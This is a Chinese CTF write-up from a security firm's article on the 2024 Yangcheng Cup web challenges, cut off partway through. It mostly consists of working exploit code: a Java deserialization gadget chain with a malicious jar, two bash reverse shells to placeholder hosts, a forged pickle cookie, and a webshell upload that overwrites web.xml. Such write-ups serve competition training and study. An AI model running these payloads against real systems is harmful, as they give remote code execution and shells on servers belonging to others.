---
title: 2024年羊城杯粤港澳大湾区网络安全大赛WP-Web AK篇
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247507760&idx=1&sn=c3dfa6c24637b9fa2c44a287cd9d16b5&chksm=fa520a8ecd2583985cf45223f4c52a2d416ee178008827a90e7561f837db1434c2469d702066&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-08-30
fetch_date: 2025-10-06T18:05:54.370713
---

# 2024年羊城杯粤港澳大湾区网络安全大赛WP-Web AK篇

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnRBrw0oV4YpZ3ibcIBs2JTSgIicsWDGeC3KNzyHaU3vYibqtwuuyzsKTRapJUyIUkILHicpibAfpPpzNSw/0?wx_fmt=jpeg)

# 2024年羊城杯粤港澳大湾区网络安全大赛WP-Web AK篇

原创

NEURON

山石网科安全技术研究院

## ez\_java

阿里云CTF考过，利用EventListenerList触发toString，后面再由jackjson链触发User的getter来加载jar包到classpath中，构造链子POC如下：

```
package com.example.ycbjava;
import com.example.ycbjava.bean.User;
import com.fasterxml.jackson.databind.node.POJONode;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Vector;

public class YcbSer {
    public static void main(String[] args) throws Exception{
        POJONode json = new POJONode(new User("jar:file:/templates/Reverse.jar!/", ""));
        UndoManager undoManager = new UndoManager();
        EventListenerList eventListenerList = new EventListenerList();
        Vector vector = (Vector) getField(undoManager, "edits");
        vector.add(json);
        setField(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(eventListenerList);
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }
    public static void setField(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Object getField(final Object obj, final String fieldName) throws Exception {
        Field field = UndoManager.class.getSuperclass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
}
```

然后生成一个恶意jar包上传，在static里反弹shell：

```
package com;

import java.io.Serializable;

public class Reverse implements Serializable {
    static  {
        try {
            Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i>& /dev/tcp/xxx/1234 0>&1"});
        }catch (Exception e){
        }
    }
}
```

生成后上传，再用上面的链子加载类，再打一个反序列化触发这个恶意类实例化即可。

```
package com.example.ycbjava;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class ClassSer {
    public static void main(String[] args) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        Reverse ycbSer = new Reverse();
        oos.writeObject(ycbSer);
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }
}
```

exp:

```
import requests

url = "http://xxx/"
sess = requests.session()
sess.post(f"{url}doLogin", data={"username": "admin", "password": "admin888"})
print(sess.post(f"{url}user/upload", files={"file": ("Reverse.jar", open("Reverse.jar","rb").read())}).text)
data = {"ser": "rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdLE2xn2E6tZEAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy4ysheUxxykICAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAHWNvbS5leGFtcGxlLnljYmphdmEuYmVhbi5Vc2Vyz86z8HK2h4oCAANMAARnaWZ0dAASTGphdmEvbGFuZy9TdHJpbmc7TAAIcGFzc3dvcmRxAH4AE0wACHVzZXJuYW1lcQB+ABN4cHB0AAB0ACFqYXI6ZmlsZTovdGVtcGxhdGVzL1JldmVyc2UuamFyIS9wcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHB4AAAAAAAAAGRweA=="}
print(sess.post(url + "user/ser", data=data).text)
data = {"ser": "rO0ABXNyAAtjb20uUmV2ZXJzZcqWlNPI/TZfAgAAeHA="}
print(sess.post(url + "user/ser", data=data).text)
```

## Lyrics For You

任意文件读取，读key再构造反序列化打反弹就行。

```
import base64, hashlib, hmac, requests
from cookie import touni, tob
from config.secret_key import secret_code

url = "http://xxx/"

def cookie_encode(data, key):
    msg = base64.b64encode(data)
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg

payload = touni(cookie_encode(b'''(cos
system
S'bash -c "bash -i>&   /dev/tcp/xxx/7777 0>&1"'
o.''', secret_code).decode())
requests.get(url + "board", cookies={"user": payload})
```

## tomtom2

先读取tomcat-users.xml拿到用户名和密码：

```
<user username="admin" password="This_is_my_favorite_passwd" roles="manager-gui"/>
```

然后登录，有上传功能，只能传xml，覆盖WEB-INF下的xml把xml后缀的文件当初jsp解析即可，先传马再覆盖配置即可，exp:

```
import time
import requests

url = "http://xxx/myapp/"
sess = requests.session()

def login():
    sess.post(url + "login", data={"username": "admin", "password": "This_is_my_favorite_passwd"})

def uploadwebshell():
    files = {'file': ("a.xml", open("xxx.jsp", "rb").read())}
    print(sess.post(url + "upload?path=uploads", files=files).text)

def uploadwebxml():
    data = """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <servlet>
        <servlet-name>xmlwithjsp</servlet-name>
        <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
        <init-param>
            <param-name>fork</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>3</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>xmlwithjsp</servlet-name>
        <url-pattern>*.xml</url-pattern>
    </servlet-mapping>
</web-app>"""
    files = {'file': ("web.xml", data)}
    print(sess.post(url + "upload?path=WEB-INF", files=files).text)

login()
uploadwebshell()
uploadwebxml()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRBrw0oV4YpZ3ibcIBs2JTSgicJiaqYibUXTaBPeSh3loSUiaC7KDSdrUpWZicmOiaLyvZeLykABG2ROggibQ/640?wx_fmt=png&from=appmsg)

## 网络照相馆

任意文件读取file://localhost/var/www/html/url.php，读到这些：

```
<?php
//error_reporting(0);
include_once 'function.php';
include_once 'sql.php';

$baseDir = "data/";

if(isset($_POST['url']))
{
    $url = $_POST['url'];
    $parse = parse_url($url);
    if(!isset($parse['host']))
    {
        die("url错误！");
    }
    $data = curl($url);
    $filename = $baseDir .  get_filename(8);
    file_put_contents($filename , $data);
    if (check($conn, $filename, $url)){
        file_put_contents($filename , $data);
        $sql = "INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)";
        if($stmt = mysqli_prepare($conn, $sql)){
            mysqli_stmt_bind_param($stmt, "ss", $url, $filename);
            mysqli_stmt_execute($stmt);
        }
    }
    else{
        unlink($filename);
    }
    echo $data;
}
?>
```

function.php

```
<?php

function curl($url){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $tmpInfo = curl_exec($curl);
    curl_close($curl);
    return $tmpInfo;
}

function get_filename($len){
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij...